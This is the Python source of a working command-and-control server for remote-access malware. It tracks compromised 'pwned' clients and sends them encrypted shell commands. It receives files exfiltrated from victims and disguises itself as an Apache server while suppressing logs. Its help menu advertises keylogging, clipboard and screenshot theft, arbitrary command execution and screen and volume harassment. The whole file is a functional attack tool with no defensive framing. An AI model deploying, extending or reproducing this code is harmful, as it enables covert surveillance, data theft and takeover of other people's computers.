from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from os import path, mkdir, system, listdir
from urllib.parse import unquote_plus
from inputimeout import inputimeout, TimeoutOccurred
from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
from encryption import cipher
from settings import (PORT, CMD_REQUEST, CWD_RESPONSE, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR,
                      FILE_REQUEST, FILE_SEND, INCOMING, ZIP_PASSWORD, OUTGOING, SHELL, LOG)


def get_new_client():
    global active_client, pwned_dict, pwned_id, cwd

    cwd = "~"

    if len(pwned_dict) == 1:
        print("Waiting for new connections.\n")
        pwned_dict = {}
        pwned_id = 0
        active_client = 1
    else:
        while True:
            for key, value in pwned_dict.items():
                if key != active_client:
                    print(key, "-", value)
            try:
                new_client = int(input("\nChoose a pwned id to make active: "))
            except ValueError:
                print("\nYou must choose a pwned id of one of the clients shown on the screen.\n")
                continue

            if new_client in pwned_dict and new_client != active_client:
                old_active_client = active_client
                active_client = new_client
                del pwned_dict[old_active_client]
                print(f"\nActive client is now: {pwned_dict[active_client]}")
                break
            else:
                print("\nYou must choose a pwned id of one of the clients shown on the screen.\n")
                continue


class C2Handler(BaseHTTPRequestHandler):
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    def do_GET(self):
        global active_client, client_account, client_hostname, pwned_dict, pwned_id

        if self.path.startswith(CMD_REQUEST):
            client = self.path.split(CMD_REQUEST)[1]
            client = cipher.decrypt(client.encode()).decode()
            client_account = client.split('@')[0]
            client_hostname = client.split('@')[1]

            if client not in pwned_dict.values():
                self.http_response(404)
                pwned_id += 1
                pwned_dict[pwned_id] = client
                print(f"{client_account}@{client_hostname} has been pwned!\n")
                with open(LOG, "a") as file_handle:
                    file_handle.write(f"{datetime.now()}, {self.client_address}, {pwned_dict[pwned_id]}\n")

            elif client == pwned_dict[active_client]:

                if INPUT_TIMEOUT:
                    try:
                        command = inputimeout(prompt=f"{client_account}@{client_hostname}:{cwd}$ ",
                                              timeout=INPUT_TIMEOUT)
                    except TimeoutOccurred:
                        command = KEEP_ALIVE_CMD
                else:
                    command = input(f"{client_account}@{client_hostname}:{cwd}$ ")

                if command.startswith("server "):

                    if command == "server show clients":
                        print("Available pwned clients:")
                        print_last = None
                        for key, value in pwned_dict.items():
                            if key == active_client:
                                print_last = str(key) + " - " + value
                            else:
                                print(key, "-", value)
                        print("\nYour active client:", print_last, sep="\n")

                    elif command.startswith("server control"):

                        try:
                            possible_active_client = int(command.split()[2])
                            if possible_active_client in pwned_dict:
                                active_client = possible_active_client
                                print(f"Waiting for {pwned_dict[active_client]} to wake up.")
                            else:
                                raise ValueError
                        except (ValueError, IndexError):
                            print("You must enter a proper pwned id.  Use server show clients command.")

                    elif command.startswith("server zip"):

                        filename = None

                        try:
                            filename = command.split()[2]
                            if not path.isfile(f"{OUTGOING}/{filename}"):
                                raise OSError

                            with AESZipFile(f"{OUTGOING}/{filename}.zip", "w", compression=ZIP_LZMA,
                                            encryption=WZ_AES) as zip_file:
                                zip_file.setpassword(ZIP_PASSWORD)
                                zip_file.write(f"{OUTGOING}/{filename}", filename)
                                print(f"{OUTGOING}/{filename} is now zip-encrypted.\n")
                        except OSError:
                            print(f"Unable to access {OUTGOING}/{filename}.\n")
                        except IndexError:
                            print(f"You must enter the filename located in {OUTGOING} to zip.\n")

                    elif command.startswith("server unzip"):

                        filename = None

                        try:
                            filename = command.split()[2]
                            with AESZipFile(f"{INCOMING}/{filename}") as zip_file:
                                zip_file.setpassword(ZIP_PASSWORD)
                                zip_file.extractall(INCOMING)
                                print(f"{INCOMING}/{filename} is now unzipped and decrypted.\n")
                        except OSError:
                            print(f"{filename} was not found in {INCOMING}.\n")
                        except IndexError:
                            print(f"You must enter the filename located in {INCOMING} to unzip.\n")

                    elif command.startswith("server list"):
                        directory = None
                        try:
                            directory = command.split()[2]
                            print(*listdir(directory), sep="\n")
                        except NotADirectoryError:
                            print(f"{directory} is not a directory.")
                        except FileNotFoundError:
                            print(f"{directory} was not found on the server.")
                        except IndexError:
                            print(*listdir(), sep="\n")

                    elif command == "server exit":
                        print("The c2 server has been shut down.")
                        server.shutdown()

                    elif command == "server shell":
                        print("Type exit to return to the c2 server's terminal window.")
                        system(SHELL)

                    elif command == "server help":
                        print("Client Commands:",
                              "client download FILENAME - transfer a file from the server to the client",
                              "client upload FILENAME - transfer a file from the client to the server",
                              "client zip FILENAME - zip and encrypt a file on the client",
                              "client unzip FILENAME - unzip and decrypt a file on the client",
                              "client kill - permanently shutdown the active client",
                              "client delay SECONDS - change the delay setting for a client's reconnection attempts",
                              "client get clipboard - grab a copy of the client's clipboard",
                              "client keylog on - start up a keylogger on the client",
                              "client keylog off - turn off the keylogger on the client and write the results to disk",
                              "client type TEXT - type the text of your choice on a client's keyboard",
                              "client screenshot - grab a copy of the client's screens",
                              "client display IMAGE - display an image on the client's screen",
                              "client flip screen - flip a client's screen upside down",
                              "client rotate screen - rotate a client's screen",
                              "client max volume - turn a client's volume all the way up",
                              "client play FILENAME.wav - play a .wav sound file on the client",
                              "* - run an OS command on the client that doesn't require input",
                              "* & - run an OS command on the client in the background", sep="\n")
                        print("\nServer Commands:",
                              "server show clients - print an active listing of our pwned clients",
                              "server control PWNED_ID - change the active client that you have a prompt for",
                              "server zip FILENAME - zip and encrypt a file in the outgoing folder on the server",
                              "server unzip FILENAME - unzip and decrypt a file in the incoming folder on the server",
                              "server exit - gracefully shuts down the server",
                              "server list DIRECTORY - obtain a file listing of a directory on the server",
                              "server shell - obtain a shell on the server", sep="\n")

                    self.http_response(204)

                else:
                    try:
                        self.http_response(200)
                        self.wfile.write(cipher.encrypt(command.encode()))

                    except OSError:
                        print(f"Lost connection to {pwned_dict[active_client]}.\n")
                        get_new_client()
                    else:
                        if command == "client kill":
                            get_new_client()

            else:
                self.http_response(404)

        elif self.path.startswith(FILE_REQUEST):
            filepath = self.path.split(FILE_REQUEST)[1]
            filepath = cipher.decrypt(filepath.encode()).decode()

            try:
                with open(f"{filepath}", "rb") as file_handle:
                    self.http_response(200)
                    self.wfile.write(cipher.encrypt(file_handle.read()))
            except OSError:
                print(f"{filepath} was not found on the c2 server.")
                self.http_response(404)

        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP GET.  Why?\n")

    def do_POST(self):
        if self.path == RESPONSE:
            print(self.handle_post_data())

        elif self.path == CWD_RESPONSE:
            global cwd
            cwd = self.handle_post_data()

        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP POST.  Why?\n")

    def do_PUT(self):
        if self.path.startswith(FILE_SEND + "/"):
            self.http_response(200)
            filename = self.path.split(FILE_SEND + "/")[1]
            filename = cipher.decrypt(filename.encode()).decode()
            incoming_file = INCOMING + "/" + filename
            file_length = int(self.headers['Content-Length'])
            with open(incoming_file, 'wb') as file_handle:
                file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
            print(f"{incoming_file} has been written to the c2 server.")

        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP PUT.  Why?\n")

    def handle_post_data(self):
        self.http_response(200)
        content_length = int(self.headers.get("Content-Length"))
        client_data = self.rfile.read(content_length)
        client_data = client_data.decode()
        client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)
        client_data = unquote_plus(client_data)
        client_data = cipher.decrypt(client_data.encode()).decode()
        return client_data

    def http_response(self, code: int):
        self.send_response(code)
        self.end_headers()

    def log_request(self, code="-", size="-"):
        return


active_client = 1
cwd = "~"
client_account = ""
client_hostname = ""
pwned_id = 0
pwned_dict = {}

if not path.isdir(INCOMING):
    mkdir(INCOMING)

if not path.isdir(OUTGOING):
    mkdir(OUTGOING)

server = ThreadingHTTPServer((BIND_ADDR, PORT), C2Handler)
server.serve_forever()
